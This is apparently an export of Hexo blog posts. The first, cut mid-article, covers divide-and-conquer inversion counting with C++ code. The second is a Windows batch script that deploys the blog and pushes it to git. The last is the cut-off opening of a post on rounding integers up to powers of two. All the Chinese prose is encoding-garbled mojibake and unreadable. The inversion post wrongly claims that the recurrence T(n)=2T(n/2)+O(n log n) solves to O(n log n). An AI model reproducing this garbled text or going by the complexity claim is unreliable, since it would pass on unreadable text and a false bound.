<p>é€†åºæ•°æ˜¯2.</p>
<h3 id="æš´åŠ›æ³•"><a href="#æš´åŠ›æ³•" class="headerlink" title="æš´åŠ›æ³•"></a>æš´åŠ›æ³•</h3><p>å¾ˆå®¹æ˜“å°±æƒ³åˆ°çš„ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ä»å¤´å¼€å§‹æ‰«æï¼Œç„¶åå¯¹äºæ¯ä¸€ä¸ªæ‰«æåˆ°çš„æ•°å­—<code>a</code>ï¼Œè€ƒå¯Ÿåé¢çš„æ¯ä¸€ä¸ªæ•°å­—<code>b</code>ï¼Œè§‚å¯Ÿå…¶æ˜¯å¦æ»¡è¶³é€†åºçš„å®šä¹‰ï¼Œä¾‹å¦‚å¯¹äºä¸Šè¿°æ•°åˆ—ï¼Œå¯¹äºæ•°å­—1ï¼Œé€†åºæ•°ä¸º0ï¼›å¯¹äºæ•°å­—3ï¼Œé€†åºæ•°ä¸º1ï¼ˆ<code>&lt;3,2&gt;</code>ï¼‰ï¼Œä¾æ­¤ç±»æ¨ï¼Œæœ€ç»ˆæ•°åˆ—æ€»çš„é€†åºæ•°ä¸º2.</p>
<p>å¾ˆé—æ†¾ï¼Œè¯¥ç®—æ³•å¤æ‚åº¦ä¸º$O(n^2)$,å¯¹äºæš´èºçš„å¼ ä¸‰æ¥è¯´ï¼Œå½“å…¶è¦è®¡ç®—é•¿åº¦ä¸º10000çš„æ•°åˆ—çš„é€†åºæ•°æ—¶å€™ï¼Œä»–æ˜¯æ— æ³•æ¥å—é•¿æ—¶é—´ç­‰å¾…çš„ï¼Œ<del>å› ä¸ºä»–è¿˜è¦å»å’Œé˜¿ççº¦ä¼šå‘¢</del></p>
<h3 id="åˆ†æ²»æ³•"><a href="#åˆ†æ²»æ³•" class="headerlink" title="åˆ†æ²»æ³•"></a>åˆ†æ²»æ³•</h3><blockquote>
<p>åˆ†è€Œæ²»ä¹‹ï¼Œé€ä¸ªå‡»ç ´</p>
</blockquote>
<p>åˆ†æ²»æ³•çš„æ€æƒ³æ˜¯å°†åŸé—®é¢˜åˆ†è§£æˆè‹¥å¹²ä¸ªå­é—®é¢˜ï¼Œè€Œæ‰€æœ‰çš„å­é—®é¢˜è¿›è¡Œç®€å•å¤„ç†åå°±å¯ä»¥å¾—åˆ°åŸé—®é¢˜çš„è§£ã€‚æ±‚è§£å­é—®é¢˜çš„è¿‡ç¨‹äº¦å¯ä»¥ç»§ç»­åˆ†è§£æˆå­å­é—®é¢˜ï¼Œè€Œå­é—®é¢˜åˆ†è§£åˆ°â€œåŸå­é—®é¢˜â€ï¼ˆåŸå­é—®é¢˜å¥½åƒä¹Ÿä¸å¤ªä¸¥è°¨ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ä¸€ä¸ªå¯ä»¥ç›´æ¥æ±‚è§£çš„é—®é¢˜ï¼‰åå¯ä»¥ç«‹å³å¾—åˆ°è§£ã€‚</p>
<p>ä¾‹å¦‚å¯¹äºä¸‹é¢çš„æ•°åˆ—ï¼šæˆ‘ä»¬å¯ä»¥æ¯æ¬¡æŠŠå­æ•°åˆ—åˆ†æˆä¸¤åŠï¼Œåˆ†åˆ«æ±‚å·¦åŠéƒ¨åˆ†å’Œå³åŠéƒ¨åˆ†çš„é€†åºæ•°</p>
<p><img src="https://cdn.yalexin.top/image-20220929225648745.png" alt="image-20220929225648745"></p>
<p>é‚£æˆ‘ä»¬å¦‚ä½•è¿˜åŸå‡ºåŸé—®é¢˜çš„è§£å‘¢ï¼Ÿå³æœªåˆ†è§£é—®é¢˜æ—¶å€™çš„é€†åºæ•°ã€‚ä»”ç»†æƒ³æƒ³ï¼Œæˆ‘ä»¬å·²ç»è®¡ç®—å‡ºäº†å·¦å³ä¸¤è¾¹é€†åºæ•°<code>leftCnt</code>ã€<code>rightCnt</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†è®¡ç®—å‡ºåœ¨â€œ ä¸€ä¸ªæ•°å­—å–è‡ªå·¦è¾¹ï¼Œå¦ä¸€ä¸ªæ•°å­—å–è‡ªå³è¾¹â€çš„æƒ…å†µä¸‹ï¼Œé€†åºæ•°<code>cnt</code>çš„å¤§å°ï¼ŒåŸé—®é¢˜ä¸å°±æ˜¯è¿™ä¸‰ä¸ªæ•°å­—ä¹‹å’Œå—ï¼Ÿ</p>
<p>å…³é”®æ˜¯æ€ä¹ˆæ±‚<code>cnt</code>?</p>
<p>è€æ–¹æ³•ï¼Ÿä¾æ¬¡ä»å·¦è¾¹é€‰ä¸€ä¸ªæ•°å­—<code>a</code>ï¼Œå†ä¾æ¬¡ä»å³è¾¹é€‰ä¸€ä¸ªæ•°å­—<code>b</code>ï¼Œå¾ˆæŠ±æ­‰ï¼Œè¿™æ ·å­ä¸‹æ¥è¦åˆ¤æ–­$\frac{n}{2}*\frac{n}{2}=\frac{n^2}{4}   $æ¬¡ï¼Œç»¼åˆä¸‹æ¥æ—¶é—´å¤æ‚åº¦è¿˜æ˜¯$O(n^2)$ã€‚</p>
<p>ä»”ç»†æƒ³æƒ³ï¼Œæˆ‘ä»¬è¦åˆ¤æ–­çš„æ•°å­—ä¸€ä¸ªæ¥è‡ªå·¦è¾¹ï¼Œä¸€ä¸ªæ¥è‡ªå³è¾¹ï¼Œå¦‚æœæˆ‘ä»¬åˆ†åˆ«è®©å·¦è¾¹å’Œå³è¾¹æœ‰åºï¼Œç„¶ååˆ†åˆ«ä»ç¬¬ä¸€ä¸ªå¼€å§‹éå†ï¼Œæ ¹æ®éå†åˆ°çš„æ•°å­—è¿›è¡Œè®¡ç®—é€†åºæ•°ï¼Œæ ¹æ®æœ‰åºçš„æ€§è´¨ï¼Œéå†å®Œåé€†åºæ•°ä¹Ÿæ±‚è§£å‡ºæ¥äº†ï¼Œæ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ’åºèŠ±è´¹$O(n\log n)$ï¼Œéå†èŠ±è´¹$O(n)$ï¼Œå³åˆå¹¶å­é—®é¢˜èŠ±è´¹$O(n\log n)$.</p>
<p>å…³äºåˆå¹¶è¿‡ç¨‹çš„ä»”ç»†åˆ†æï¼Œå¦‚ä¸‹(ç®€å•èµ·è§ï¼Œ<strong>æ•°åˆ—ä¸­ä¸åŒ…å«ç›¸åŒå…ƒç´ </strong>)ï¼š</p>
<p>å…ˆå°†å·¦å³ä¸¤éƒ¨åˆ†æ’åºï¼Œè®¾ç½®ä¸¤ä¸ªæŒ‡é’ˆï¼Œåˆ†åˆ«ä»å·¦å³ä¸¤éƒ¨åˆ†è¿›è¡Œéå†ï¼Œè®¾å·¦è¾¹éå†å¾—åˆ°çš„æ•°å­—æ˜¯<code>a[i]</code>ï¼Œå³è¾¹çš„æ˜¯<code>b[j]</code>ã€‚</p>
<ol>
<li>å³è¾¹çš„æŒ‡é’ˆjä¸æ–­å¾€åç§»åŠ¨ï¼ˆå°šæœªåˆ°ç»“å°¾ï¼Œå¦‚æœåˆ°ç»“å°¾ï¼Œåˆ™åˆ°æ­¥éª¤3ï¼‰ï¼Œç›´åˆ°<code>b[j]</code>æ°å¥½æ˜¯å³åŠéƒ¨åˆ†ä¸­ç¬¬ä¸€ä¸ªä¸å°äº<code>a[i]</code>çš„æ•°å­—ï¼Œå³åœ¨å³åŠéƒ¨åˆ†ä¸­<code>b[j]</code>çš„å·¦è¾¹éƒ½æ˜¯å°äº<code>a[i]</code>çš„ï¼Œæ­¤æ—¶ï¼Œç”±<code>a[i]</code>ä½œä¸ºç¬¬ä¸€ä¸ªæ•°å­—ç»„æˆçš„è·¨è¶Šå·¦å³ä¸¤éƒ¨åˆ†çš„æ•°å¯¹ï¼ˆæˆ–è€…è¯´åºå¶ï¼‰ä¸­ï¼Œé€†åºæ•°åˆšå¥½å°±æ˜¯å³åŠéƒ¨åˆ†ä¸­<code>b[j]</code>çš„å·¦è¾¹çš„æ•°å­—ä¸ªæ•°ã€‚è¯´èµ·æ¥æœ‰ç‚¹ç»•å£ï¼Œçœ‹çœ‹ä¸‹é¢çš„å›¾ï¼š</li>
</ol>
<p><img src="https://cdn.yalexin.top/image-20220930001126349.png" alt="image-20220930001126349"></p>
<p>æ­¤æ—¶é€†åºæ•°<code>cnt</code>è¦åŠ ä¸Š<code>n</code>.</p>
<ol start="2">
<li>å·¦è¾¹çš„æŒ‡é’ˆè¦å¾€åç§»åŠ¨ï¼Œå³æŒ‡å‘<code>a[i+1]</code>,é‚£ä¹ˆå°±ä¼šæœ‰ä¸¤ç§æƒ…å†µï¼š</li>
</ol>
<ul>
<li>â‘ <code>a[i+1]&gt;b[j]</code>:è¿™ä¸ªå¾ˆå¥½è§£å†³ï¼Œç»§ç»­å›åˆ°æ­¥éª¤1å³å¯ã€‚</li>
<li>â‘¡<code>a[i+1]&lt;b[j]</code>:ç”±äº<code>b[j]</code>çš„å·¦è¾¹éƒ½æ˜¯å°äº<code>a[i]</code>ï¼Œå³å­˜åœ¨è¿™æ ·çš„å…³ç³»ï¼š<code>b[j]&gt;a[i+1]&gt;a[i]&gt;b[j-1]</code>ï¼Œæ•…æ­¤æ—¶ç”±<code>a[i+1]</code>ä½œä¸ºç¬¬ä¸€ä¸ªæ•°å­—ç»„æˆçš„è·¨è¶Šå·¦å³ä¸¤éƒ¨åˆ†çš„æ•°å¯¹ï¼ˆæˆ–è€…è¯´åºå¶ï¼‰ä¸­ï¼Œé€†åºæ•°ä¹Ÿæ˜¯<code>n</code>ï¼Œæ­¤æ—¶é€†åºæ•°<code>cnt</code>è¦åŠ ä¸Š<code>n</code>.ä¸‹ä¸€æ­¥å·¦è¾¹çš„æŒ‡é’ˆè¦å¾€åç§»åŠ¨ï¼Œç»§ç»­æ­¥éª¤â‘¡ï¼Œç›´åˆ°å·¦è¾¹çš„æŒ‡é’ˆæŒ‡å‘å…ƒç´ æ¯”å³è¾¹æŒ‡é’ˆæŒ‡å‘çš„å¤§ï¼Œå›åˆ°æ­¥éª¤1ï¼Œå‡è‹¥å·¦è¾¹çš„æŒ‡é’ˆå…ˆåˆ°äº†å·¦åŠéƒ¨åˆ†çš„æœ€å³è¾¹ï¼Œåˆ™åˆ°æ­¥éª¤3ã€‚</li>
</ul>
<ol start="3">
<li>æ­¤æ—¶è¦ä¹ˆå·¦åŠéƒ¨åˆ†å…ˆéå†å®Œï¼Œè¦ä¹ˆå³åŠéƒ¨åˆ†å…ˆéå†å®Œï¼Œå‡å¦‚æ˜¯å·¦è¾¹å…ˆéå†å®Œï¼Œåˆ™è¯´æ˜æ­¤æ—¶â€œè·¨è¶Šå·¦å³ä¸¤åŠéƒ¨åˆ†çš„é€†åºæ•°â€ç»Ÿè®¡å®Œæˆï¼Œå³<code>cnt</code>æ˜¯æ­£ç¡®çš„å€¼ï¼Œè·³æ­¥éª¤4.å¦‚æœæ˜¯å³åŠéƒ¨åˆ†å…ˆéå†å®Œæˆï¼Œåˆ™è¯´æ˜å·¦è¾¹å°šæœªéå†å®Œæˆçš„æ•°å­—éƒ½è¦æ¯”å³åŠéƒ¨åˆ†çš„æ•°å­—å¤§ï¼Œæ ¹æ®è¿™ä¸ªæ¡ä»¶è®¡ç®—é€†åºæ•°åï¼Œè½¬æ­¥éª¤4.</li>
<li>å°†<code>leftCnt + rightCnt + cnt</code>ä½œä¸ºåŸé—®é¢˜çš„è§£ã€‚</li>
</ol>
<h2 id="ç®—æ³•åˆ†æ"><a href="#ç®—æ³•åˆ†æ" class="headerlink" title="ç®—æ³•åˆ†æ"></a>ç®—æ³•åˆ†æ</h2><p>ä¸‹é¢è¿›è¡Œæ—¶é—´å¤æ‚åº¦åˆ†æï¼Œæˆ‘ä»¬å­é—®é¢˜ä¸ªæ•°æ˜¯2ï¼ˆåˆ†åˆ«é€’å½’æ±‚è§£å·¦å³ä¸¤ä¸ªéƒ¨åˆ†ï¼‰ï¼Œæ¯ä¸ªå­é—®é¢˜çš„è§„æ¨¡æ˜¯åŸæ¥çš„ä¸€åŠï¼Œåˆå¹¶å­é—®é¢˜èŠ±è´¹$O(n\log n)$ã€‚</p>
<p>åˆ™ï¼š<br>$$<br>T(n)=2T(\frac{n}{2} )+O(n \log n)<br>$$<br>æ ¹æ®ä¸»å®šç†ï¼Œå¾—<br>$$<br>T(n)=O(n \log n)<br>$$</p>
<h2 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">100000</span> + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">list</span>[LEN], length;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">reverseOrderNumber</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (left &gt;= right)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (left + <span class="number">1</span> == right)<span class="keyword">return</span> <span class="built_in">list</span>[left] &gt; <span class="built_in">list</span>[right];</span><br><span class="line">    <span class="keyword">int</span> mid = (left + right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// åˆ†åˆ«æ±‚è§£å­é—®é¢˜</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> leftCnt  = reverseOrderNumber(left, mid);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> rightCnt = reverseOrderNumber(mid + <span class="number">1</span>, right);</span><br><span class="line">    <span class="comment">// æ’åºå·¦å³ä¸¤åŠéƒ¨åˆ†</span></span><br><span class="line">    <span class="keyword">int</span> *l1 = <span class="built_in">list</span> + left, *r1 = <span class="built_in">list</span> + mid - left + <span class="number">1</span> + left;</span><br><span class="line">    sort(l1, r1);</span><br><span class="line">    sort(r1, <span class="built_in">list</span> + right + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// è®¡ç®—è·¨å·¦å³éƒ¨åˆ†çš„é€†åºæ•°</span></span><br><span class="line">    <span class="keyword">int</span> i = left, j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= right)&#123;</span><br><span class="line">        <span class="comment">// åœ¨å³è¾¹å¯»æ‰¾ç¬¬ä¸€ä¸ªå¤§äº a[i] çš„å…ƒç´ </span></span><br><span class="line">        <span class="keyword">while</span>(j &lt;= right &amp;&amp; <span class="built_in">list</span>[i] &gt; <span class="built_in">list</span>[j])j++;</span><br><span class="line">        <span class="keyword">if</span> (j &gt; right)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= mid &amp;&amp; <span class="built_in">list</span>[i] &lt; <span class="built_in">list</span>[j])&#123;</span><br><span class="line">            i++;</span><br><span class="line">            cnt += j - <span class="number">1</span> - mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å·¦è¾¹å°šæœªéå†å®Œçš„æ•°å­—éƒ½è¦æ¯”å³åŠéƒ¨åˆ†çš„å¤§</span></span><br><span class="line">    <span class="keyword">if</span>(j &gt; right) cnt += (mid - i + <span class="number">1</span>) * (right - mid);</span><br><span class="line">    <span class="comment">// åˆå¹¶å­é—®é¢˜</span></span><br><span class="line">    <span class="keyword">return</span> leftCnt + rightCnt + cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// printf("input the length:\n");</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;length);</span><br><span class="line">    <span class="comment">// printf("input the value:\n");</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;<span class="built_in">list</span>[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>, reverseOrderNumber(<span class="number">0</span>, length - <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5 3 7 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5 9 7 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">5 9 12 16 2 3 13 14</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">7 4 3</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">2 6 3 4 5 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<hr>
<p>å®é™…ä¸Šæ’åºè¿‡ç¨‹ä¹Ÿå¯ä»¥ä½¿ç”¨å½’å¹¶æ’åºï¼Œå¹¶ä¸”æ’åºè¿‡ç¨‹å°±å¯ä»¥è®¡ç®—é€†åºæ•°äº†ï¼Œä¸è¿‡å½’å¹¶æ’åºè¿‡ç¨‹è¦è¾…åŠ©ç©ºé—´ï¼Œè¿™é‡Œå°±æ²¡æœ‰é‡‡ç”¨ã€‚</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>åˆ†æ²»</tag>
        <tag>æ’åº</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ç¼–å†™éƒ¨ç½²æ–°æ–‡ç« å‘½ä»¤è„šæœ¬</title>
    <url>/2020/03/04/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99%E5%91%BD%E4%BB%A4%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€èˆ¬è€Œè¨€ï¼Œå†™å¥½çš„Markdownæ–‡ç« åº”è¯¥æ”¾åˆ°åšå®¢ç›®å½•çš„source_postsæ–‡ä»¶å¤¹ä¸‹ï¼Œç„¶åä½¿ç”¨å‘½ä»¤hexo g -dæˆ–è€…æ˜¯hexo d -gè¿›è¡Œéƒ¨ç½²ã€‚æˆ‘åœ¨ä½¿ç”¨hexoçš„æ—¶å€™ï¼Œæˆ‘çš„hexoæ‰€æœ‰æ–‡ä»¶è¿˜å…³è”ç€ç äº‘ä¸Šçš„ä»“åº“ï¼Œæˆ‘ä¹ æƒ¯äºå‘è¡¨æ–°æ–‡ç« åæŠŠhexoçš„æ‰€æœ‰æ–‡ä»¶éƒ½æ›´æ–°åˆ°ç äº‘è¿œç«¯ä»“åº“ã€‚æŒ‰ä»¥å‰é‚£ç§æ–¹å¼ï¼Œæˆ‘é¦–å…ˆéœ€è¦åœ¨åšå®¢ç›®å½•ä¸­ç”¨å‘½ä»¤éƒ¨ç½²æœ€æ–°çš„æ–‡ç« ï¼Œç„¶åå†ä½¿ç”¨git add .ç­‰å‘½ä»¤å°†æœ¬åœ°æ‰€æœ‰æ–‡ä»¶æ¨é€åˆ°è¿œç«¯ã€‚è€å®è¯´ï¼Œæˆ‘æ‰¿è®¤è‡ªå·±æ˜¯ä¸ªæ‡’äººï¼Œæ‰€ä»¥å°±æƒ³åˆ°äº†ç”¨æ‰¹å¤„ç†æ–‡ä»¶batå®ç°æˆ‘çš„æ‡’äººæ¢¦ï¼Œåœ¨é‚£ä¹‹å‰æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹batã€‚</p>
<a id="more"></a>

<h2 id="batçš„ç®€å•ä»‹ç»"><a href="#batçš„ç®€å•ä»‹ç»" class="headerlink" title="batçš„ç®€å•ä»‹ç»"></a>batçš„ç®€å•ä»‹ç»</h2><p>.batæ–‡ä»¶æœ‰ç‚¹ç±»ä¼¼äºlinuxç³»ç»Ÿä¸‹çš„shellè„šæœ¬æ–‡ä»¶.shï¼Œ ä¸‹é¢æ˜¯batçš„ç®€å•ç”¨æ³•ï¼Œæ›´å¤šå…³äºbatè„šæœ¬çš„è¯¦ç»†ä»‹ç»å¯ä»¥æŸ¥çœ‹<a href="https://baike.baidu.com/item/BAT/365230" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚ </p>
<table>
<thead>
<tr>
<th align="center">è¯­æ³•</th>
<th align="center">è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">è¡¨ç¤ºæ‰“å°è¯¥å‘½ä»¤åçš„å­—ç¬¦ï¼Œå¦‚echo helloæ‰§è¡Œåä¼šæ‰“å°â€œhelloâ€</td>
</tr>
<tr>
<td align="center">echo off</td>
<td align="center">è¡¨ç¤ºåœ¨æ­¤è¯­å¥åæ‰€æœ‰è¿è¡Œçš„å‘½ä»¤éƒ½ä¸æ˜¾ç¤ºå‘½ä»¤æœ¬èº« ï¼Œä½†æœ¬èº«ä¼šæ˜¾ç¤º</td>
</tr>
<tr>
<td align="center">@</td>
<td align="center">ä¸echo offç›¸è±¡ï¼Œä½†å®ƒæ˜¯åŠ åœ¨æ¯ä¸ªå‘½ä»¤è¡Œçš„æœ€å‰é¢ï¼Œè¡¨ç¤ºè¿è¡Œæ—¶ä¸æ˜¾ç¤ºè¿™ä¸€è¡Œçš„å‘½ä»¤è¡Œï¼ˆåªèƒ½å½±å“å½“å‰è¡Œï¼‰</td>
</tr>
<tr>
<td align="center">@echo off</td>
<td align="center">ç»„åˆä¸Šä¸¤ä¸ªè¯­æ³•ï¼Œè¡¨ç¤ºä¸æ˜¾ç¤ºåç»­æ‰§è¡Œå‘½ä»¤åŠå½“å‰å‘½ä»¤</td>
</tr>
<tr>
<td align="center">dir c:<em>.</em> &gt;a.txt</td>
<td align="center">å°†cç›˜æ–‡ä»¶åˆ—è¡¨å†™å…¥a.txt</td>
</tr>
<tr>
<td align="center">call</td>
<td align="center">ç”¨äºè°ƒç”¨å¦ä¸€ä¸ªæ‰¹å¤„ç†å‘½ä»¤æˆ–æ–‡ä»¶ï¼ˆå¦‚æœä¸ç”¨callè€Œç›´æ¥è°ƒç”¨åˆ«çš„æ‰¹å¤„ç†æ–‡ä»¶ï¼Œé‚£ä¹ˆæ‰§è¡Œå®Œé‚£ä¸ªæ‰¹å¤„ç†æ–‡ä»¶åå°†æ— æ³•è¿”å›å½“å‰æ–‡ä»¶å¹¶æ‰§è¡Œå½“å‰æ–‡ä»¶çš„åç»­å‘½ä»¤ï¼‰</td>
</tr>
<tr>
<td align="center">call c:\ucdos\ucdos.bat</td>
<td align="center">è°ƒç”¨ucdos.batè„šæœ¬</td>
</tr>
<tr>
<td align="center">pause</td>
<td align="center">æš‚åœæ‰¹å¤„ç†çš„æ‰§è¡Œå¹¶åœ¨å±å¹•ä¸Šæ˜¾ç¤ºPress any key to continueâ€¦çš„æç¤ºï¼Œç­‰å¾…ç”¨æˆ·æŒ‰ä»»æ„é”®åç»§ç»­</td>
</tr>
<tr>
<td align="center">rem</td>
<td align="center">ç”¨äºæ³¨é‡Šï¼Œä¹Ÿå¯ä»¥ç”¨ ::ä»£æ›¿</td>
</tr>
<tr>
<td align="center">start</td>
<td align="center">è°ƒèµ·å¦å¤–ä¸€ä¸ªçª—å£æ‰§è¡Œå½“å‰è¡Œå‘½ä»¤</td>
</tr>
</tbody></table>
<h2 id="ç¼–å†™éƒ¨ç½²è„šæœ¬"><a href="#ç¼–å†™éƒ¨ç½²è„šæœ¬" class="headerlink" title="ç¼–å†™éƒ¨ç½²è„šæœ¬"></a>ç¼–å†™éƒ¨ç½²è„šæœ¬</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D:</span><br><span class="line">cd D:\private\blog</span><br><span class="line">call hexo clean</span><br><span class="line">call hexo g</span><br><span class="line">call hexo d&amp;&amp;cd ..&amp;&amp;git add .&amp;&amp;git commit -m %1&amp;&amp;git push&amp;&amp;cd blog</span><br></pre></td></tr></table></figure>

<p>å°†ä¸Šè¿°å‘½ä»¤ä¿å­˜ä¸ºxxx.bat</p>
<p>å…³äºcallçš„ç”¨æ³•ä¸Šé¢è¡¨æ ¼æœ‰è¯´æ˜ï¼Œè¿™é‡Œè¿˜æœ‰å‡ ä¸ªâ€œ&amp;&amp;â€ï¼Œè¿™ä¸ªæ“ä½œç¬¦æ˜¯å½“â€œ&amp;&amp;â€å‰é¢çš„è¿è¡ŒæˆåŠŸååé¢çš„æ‰è¿è¡Œï¼Œè€Œâ€œ%1â€æ˜¯æŒ‡å‘batæ–‡ä»¶ä¸­ä¼ é€’å‚æ•°ä¸­çš„ç¬¬ä¸€ä¸ªï¼ˆç¬¬0ä¸ªæ˜¯å‘½ä»¤æœ¬èº«ï¼‰ï¼Œæ›´å¤šçš„batä¼ é€’å‚æ•°æ–¹æ³•å¯ä»¥å‚ç…§<a href="https://blog.csdn.net/yunnying/article/details/12010779" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>,ç„¶åå°±å¯ä»¥åœ¨.batæ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸­æ‰“å¼€cmdçª—å£æˆ–è€…shellï¼ˆé¼ æ ‡å³é”®+shiftï¼‰çª—å£ï¼Œé”®å…¥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xxx "æäº¤å¤‡æ³¨"</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥å®ç°ä¸€é”®éƒ¨ç½²æ–°æ–‡ç« ä¸”æ›´æ–°è¿œç¨‹ä»£ç ä»“åº“å•¦ï¼å½“ç„¶äº†å¦‚æœè„šæœ¬ä¸­ä¸éœ€è¦ä¼ é€’å‚æ•°ï¼Œåˆ™åªéœ€åŒå‡»xxx.batæ‰“å¼€å°±å¯ä»¥äº†ã€‚</p>
]]></content>
      <categories>
        <category>å‘½ä»¤è¡Œ</category>
      </categories>
      <tags>
        <tag>è„šæœ¬</tag>
        <tag>æ•ˆç‡</tag>
      </tags>
  </entry>
  <entry>
    <title>å°†æ­£æ•´æ•°å‘ä¸Šå–æ•´ä¸º2æ¬¡å¹‚</title>
    <url>/2020/08/11/%E5%B0%86int%E7%B1%BB%E5%9E%8B%E6%95%B4%E6%95%B0%E5%90%91%E4%B8%8A%E5%8F%962%E6%AC%A1%E5%B9%82/</url>
    <content><![CDATA[<blockquote>
<p>æœ¬æ–‡å‚è€ƒäº†å“”å“©å“”å“©UPä¸»<code>LH_Mouse</code>çš„<a href="https://www.bilibili.com/video/BV1tT4y177SR?t=650" target="_blank" rel="noopener">è§†é¢‘</a></p>
</blockquote>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç”Ÿæ´»ä¸­æˆ‘ä»¬å¯èƒ½ç»å¸¸é‡åˆ°å°†ç»™å®šçš„æ•´æ•°å‘ä¸Šå–æ•´ä¸ºæœ€æ¥è¿‘è¯¥æ•°å­—çš„2æ¬¡å¹‚çš„æƒ…å†µï¼Œä¾‹å¦‚25çš„å‘ä¸Šå–æ•´2æ¬¡å¹‚æœ€æ¥è¿‘è¯¥æ•°å­—æ˜¯32 = 2^5ï¼Œ37çš„å‘ä¸Šå–æ•´2æ¬¡å¹‚æœ€æ¥è¿‘è¯¥æ•°å­—æ˜¯64 = 2^6ï¼Œè¯¥ç®—æ³•ä¹Ÿç”¨å¾ˆå¹¿æ³›çš„åº”ç”¨ï¼Œä¾‹å¦‚<a href="http://c.biancheng.net/view/1284.html" target="_blank" rel="noopener">ä¼™ä¼´ç³»ç»Ÿå’Œslabå†…å­˜åˆ†é…æœºåˆ¶</a>ä¸­ï¼Œåˆ†é…å™¨åœ¨åˆ†é…å†…å­˜çš„æ—¶å€™ï¼Œé¦–å…ˆè®¡ç®—è¯¥æ¬¡è¯·æ±‚åˆ†é…å¤§å°çš„å‘ä¸Šå–æ•´2æ¬¡å¹‚ï¼Œ<a id="more"></a>å°†è¯¥å¤§å°çš„ç©ºé—´è¿”å›ï¼Œå³å‡å¦‚è¯·æ±‚8<code>kb</code>ï¼Œ åˆ™åˆ†é…8<code>kb</code>å¤§ä¸‹çš„ç©ºé—´ï¼Œå‡å¦‚è¯·æ±‚åˆ†é…9<code>kb</code>ï¼Œåˆ™åˆ†é…16<code>kb</code>çš„å¤§å°ç©ºé—´ï¼›åˆå¦‚ï¼Œ<code>Java</code>ä¸­çš„<code>HashMap</code>å†…éƒ¨å®é™…ä¸Šæ˜¯ä½¿ç”¨äº†æ•°ç»„ï¼Œè€Œä¸”è¯¥æ•°ç»„çš„é•¿åº¦å¤§å°æ€»æ˜¯2^nï¼Œå‡å¦‚å®ä¾‹åŒ–<code>HashMap</code>çš„æ—¶å€™æŒ‡å®šå¤§å°ä¸º<code>length</code>ï¼Œé‚£ä¹ˆå®é™…ä¸Š<code>HashMap</code>å†…éƒ¨çš„æ•°ç»„å¤§å°å°±æ˜¯<code>length</code>çš„å‘ä¸Šå–æ•´2æ¬¡å¹‚ã€‚</p>
